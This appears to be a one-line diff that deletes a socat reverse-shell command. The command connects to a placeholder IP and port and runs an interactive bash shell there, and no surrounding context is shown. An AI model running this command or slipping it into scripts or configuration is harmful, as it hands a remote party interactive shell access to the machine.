@@ -1,1 +1,0 @@
-socat tcp:ip:port exec:'bash -i' ,pty,stderr,setsid,sigint,sane &
